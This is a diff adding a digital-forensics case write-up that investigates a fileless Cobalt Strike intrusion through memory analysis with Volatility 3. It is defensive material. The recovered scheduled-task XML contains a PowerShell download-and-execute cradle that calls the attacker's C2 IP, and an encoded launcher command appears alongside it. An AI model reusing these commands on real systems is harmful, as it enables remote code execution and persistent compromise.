@@ -1,0 +1,310 @@
+# Case 02 — Fileless Malware via Process Injection: Memory Forensics Investigation
+
+**Case ID:** DFIR-2024-002  
+**Classification:** High  
+**Investigator:** Himanshu Chourasia  
+**Tools:** Volatility 3, KAPE, Magnet AXIOM, CrowdStrike Falcon  
+**Duration:** 9 hours (triage → memory acquisition → analysis → containment)
+
+---
+
+## Executive Summary
+
+A financial services firm's EDR triggered a medium-severity alert on a workstation (`WS-FIN-047`) belonging to a Finance Analyst. Initial triage revealed no malicious files on disk — the threat was entirely fileless. Memory forensics using Volatility 3 uncovered a Cobalt Strike reflective DLL injected into a legitimate `spoolsv.exe` process. The attacker had used a malicious Excel macro delivered via a spear-phishing email to bootstrap the implant directly into memory, bypassing traditional AV and leaving minimal on-disk artefacts. Full attacker dwell time was estimated at 11 days.
+
+---
+
+## MITRE ATT&CK TTP Mapping
+
+| Tactic | Technique | ID | Evidence |
+|--------|-----------|-----|---------|
+| Initial Access | Spearphishing Attachment | T1566.001 | Malicious Excel .xlsm via email |
+| Execution | User Execution: Malicious File | T1204.002 | User opened macro-enabled document |
+| Execution | Command and Scripting: VBA | T1059.005 | Excel macro spawned PowerShell |
+| Defense Evasion | Process Injection: Reflective DLL | T1055.001 | CobaltStrike beacon in spoolsv.exe |
+| Defense Evasion | Obfuscated Files or Information | T1027 | Base64 + XOR encoded shellcode |
+| Persistence | Scheduled Task | T1053.005 | PowerShell cradle in scheduled task |
+| Discovery | System Information Discovery | T1082 | Beacon enumeration commands observed |
+| C2 | Application Layer Protocol: HTTPS | T1071.001 | Beacon over port 443 to C2 |
+| Collection | Clipboard Data | T1115 | Clipboard scraping observed in memory |
+
+---
+
+## Timeline of Compromise
+
+```
+D-11  08:44 UTC  — Phishing email received: "Q4_Bonus_Structure_2024.xlsm"
+D-11  09:02 UTC  — User (asingh) opened attachment; Excel macro executed
+D-11  09:02 UTC  — EXCEL.EXE spawned PowerShell with encoded command (Event 4688)
+D-11  09:03 UTC  — Reflective DLL injection into spoolsv.exe (PID 1492)
+D-11  09:04 UTC  — First C2 beacon to 94.102.49.190:443
+D-11  09:05 UTC  — Scheduled task created for persistence
+D-11 → D-0      — Daily C2 beaconing; clipboard scraping; AD enumeration observed
+D-0   14:22 UTC  — CrowdStrike fires medium alert: anomalous network from spoolsv.exe
+D-0   14:35 UTC  — IR team engaged; memory acquisition initiated
+```
+
+---
+
+## Investigation Walkthrough
+
+### Phase 1 — Live Memory Acquisition (KAPE)
+
+Memory was acquired from the live system before any intervention using KAPE's memory acquisition module to preserve volatile artefacts.
+
+```bash
+# Acquire RAM via WinPmem (included in KAPE)
+kape.exe --tsource C: --tdest D:\Cases\DFIR-2024-002\WS-FIN-047 \
+  --target !SANS_Triage,EventLogs,Prefetch,ScheduledTasks \
+  --module WinPmem
+
+# Resulting memory image
+WS-FIN-047.mem  (16 GB)
+SHA-256: d4e8f2...a91c33  [VERIFIED]
+```
+
+---
+
+### Phase 2 — Memory Analysis with Volatility 3
+
+#### Process List Analysis
+
+```bash
+python vol.py -f WS-FIN-047.mem windows.pslist
+```
+
+**Output (truncated — suspicious entries highlighted):**
+
+```
+PID   PPID  Name                 Start Time (UTC)
+----  ----  -------------------  -------------------------
+4     0     System               2024-03-01 07:30:01
+...
+1492  628   spoolsv.exe          2024-03-01 07:30:44   ← legitimate parent (services.exe)
+4821  4316  EXCEL.EXE            2024-03-11 09:01:55
+4904  4821  powershell.exe       2024-03-11 09:02:03   ← spawned by Excel [SUSPICIOUS]
+```
+
+> **Note:** `spoolsv.exe` is expected — but its network activity and injected memory regions are not. Parent-child relationship confirmed by PPID analysis.
+
+---
+
+#### Process Tree — Anomalous Chain
+
+```bash
+python vol.py -f WS-FIN-047.mem windows.pstree
+```
+
+```
+EXCEL.EXE (4821)
+  └── powershell.exe (4904)  ← Excel should NEVER spawn PowerShell
+        └── [process exited — no child persisted on disk]
+```
+
+**PowerShell command line recovered from memory:**
+
+```powershell
+powershell.exe -NoP -NonI -W Hidden -Enc
+JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA
+[base64 truncated — decoded to reflective loader shellcode]
+```
+
+**Decoded payload (partial):**
+```
+XOR key: 0x4A
+Decoded: MZ header detected — PE file loaded reflectively into spoolsv.exe (PID 1492)
+```
+
+---
+
+#### Malfind — Injected Code Detection
+
+```bash
+python vol.py -f WS-FIN-047.mem windows.malfind --pid 1492
+```
+
+```
+Process: spoolsv.exe  PID: 1492
+Start VPN: 0x1d0000   End VPN: 0x1d3fff
+Protection: PAGE_EXECUTE_READWRITE   [SUSPICIOUS — RWX memory]
+Vad Tag: VadS  (private memory — not backed by a file on disk)
+
+Disassembly:
+0x1d0000  4d 5a 90 00  MZ....   ← PE header in process memory
+0x1d0004  03 00 00 00
+0x1d0008  04 00 00 00
+...
+```
+
+> **RWX (Read-Write-Execute) memory not backed by a file on disk** is a primary indicator of reflective DLL injection. A legitimate `spoolsv.exe` will never have executable private memory regions containing a PE header.
+
+---
+
+#### DLL List — Detecting Unlisted DLLs
+
+```bash
+python vol.py -f WS-FIN-047.mem windows.dlllist --pid 1492
+```
+
+Cross-referenced against `windows.ldrmodules` to detect hidden/unlinked DLLs:
+
+```bash
+python vol.py -f WS-FIN-047.mem windows.ldrmodules --pid 1492
+```
+
+```
+Base        InLoad  InInit  InMem  MappedPath
+----------  ------  ------  -----  -------------------------
+0x1d0000    False   False   True   [NO PATH — anonymous mapping]
+```
+
+> **`InLoad: False, InMem: True`** confirms the DLL is loaded in memory but deliberately unlinked from the PEB loader list — a hallmark of Cobalt Strike's reflective loader.
+
+---
+
+#### Network Connections
+
+```bash
+python vol.py -f WS-FIN-047.mem windows.netstat
+```
+
+```
+Offset   Proto  Local Address         Foreign Address        State    PID   Process
+------   -----  --------------------  ---------------------  -------  ----  ----------
+...
+0x...    TCPv4  10.10.5.47:52341      94.102.49.190:443      ESTAB    1492  spoolsv.exe
+```
+
+> `spoolsv.exe` establishing HTTPS connections to an external IP is anomalous. The Print Spooler service has no legitimate reason to initiate outbound internet connections.
+
+---
+
+#### Beacon Configuration Extraction
+
+The injected DLL was dumped from memory and analysed:
+
+```bash
+python vol.py -f WS-FIN-047.mem windows.dumpfiles --pid 1492 --virtaddr 0x1d0000
+```
+
+Extracted PE submitted to **1768.py (Cobalt Strike config parser)**:
+
+```
+BeaconType:          HTTPS
+C2 Server:           94.102.49.190,/jquery-3.3.1.min.js
+Port:                443
+Jitter:              15%
+Sleep:               60000ms
+UserAgent:           Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Watermark:           0x5109BF6D   ← Cobalt Strike Team Server license ID
+Spawn_to x64:        %windir%\sysnative\dllhost.exe
+```
+
+> The **watermark** (0x5109BF6D) was cross-referenced with public threat intel — associated with a cracked Cobalt Strike build used by multiple financially-motivated threat actors.
+
+---
+
+#### Clipboard Scraping Evidence
+
+```bash
+python vol.py -f WS-FIN-047.mem windows.clipboard
+```
+
+```
+Session  Handle  Format  Value
+-------  ------  ------  ------------------------------------------
+1        0x801   CF_TEXT  AccountNo: 8847291033 | IFSC: HDFC0002341
+```
+
+> Clipboard contents included financial account data, confirming the attacker's objective was financial data collection.
+
+---
+
+### Phase 3 — Persistence: Scheduled Task Recovery
+
+```bash
+python vol.py -f WS-FIN-047.mem windows.handles --pid 4904 --object-type File
+```
+
+Scheduled task XML recovered from KAPE artefacts:
+
+```xml
+<Task>
+  <Triggers>
+    <CalendarTrigger>
+      <StartBoundary>2024-03-11T09:10:00</StartBoundary>
+      <Repetition><Interval>PT4H</Interval></Repetition>
+    </CalendarTrigger>
+  </Triggers>
+  <Actions>
+    <Exec>
+      <Command>powershell.exe</Command>
+      <Arguments>-NoP -NonI -W Hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://94.102.49.190/update')"</Arguments>
+    </Exec>
+  </Actions>
+</Task>
+```
+
+> The scheduled task ran every 4 hours, re-downloading and re-injecting the beacon in case it was terminated — providing resilient persistence without leaving a persistent file on disk.
+
+---
+
+## Indicators of Compromise (IOCs)
+
+### Network
+```
+94.102.49.190:443    — Cobalt Strike C2 (HTTPS)
+/jquery-3.3.1.min.js — C2 URI pattern (jQuery malleable C2 profile)
+```
+
+### File (Phishing Document)
+```
+Q4_Bonus_Structure_2024.xlsm
+SHA-256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d906
+```
+
+### Behavioral
+```
+EXCEL.EXE → powershell.exe (parent-child — high confidence malicious)
+spoolsv.exe outbound to non-Microsoft IP on 443
+RWX anonymous memory region in spoolsv.exe containing MZ header
+Scheduled task executing PowerShell IEX cradle every 4 hours
+```
+
+### Cobalt Strike
+```
+Watermark: 0x5109BF6D
+Sleep: 60s with 15% jitter
+Spawn-to: dllhost.exe
+```
+
+---
+
+## Containment Actions Taken
+
+1. Isolated `WS-FIN-047` at the switch port level immediately
+2. Deleted malicious scheduled task from all endpoints via CrowdStrike RTR
+3. Blocked C2 IP `94.102.49.190` at perimeter firewall and web proxy
+4. Forced password reset for `asingh` and reviewed all activity over 11-day dwell window
+5. Hunted for same Cobalt Strike watermark across all endpoints via memory scanning
+6. Submitted beacon PE to VirusTotal and internal threat intel platform
+
+---
+
+## Recommendations
+
+| Finding | Recommendation |
+|---------|---------------|
+| Excel spawning PowerShell undetected | Enable ASR rule: Block Office apps from creating child processes |
+| Reflective injection into spoolsv.exe | Deploy memory scanning (CrowdStrike Falcon Insight — AMSI integration) |
+| 11-day dwell before detection | Tune EDR for anomalous outbound from print spooler processes |
+| No email attachment sandboxing | Implement sandboxed detonation for all .xlsm/.xlsb attachments |
+| Scheduled task persistence undetected | Alert on scheduled tasks with PowerShell IEX in arguments |
+
+---
+
+## Key Takeaways
+
+- **Fileless attacks leave almost no on-disk evidence.** Traditional AV and file-based scanning will miss this class of threat entirely. Memory forensics is non-negotiable for complete incident reconstruction.
+- **Volatility's `malfind` + `ldrmodules` combination** is highly effective at surfacing reflective injection — RWX private memory + unlinked DLL = near-certain injection.
+- **Cobalt Strike watermarks** are a valuable attribution and hunting pivot — the same watermark across multiple cases often indicates a shared infrastructure or threat actor.
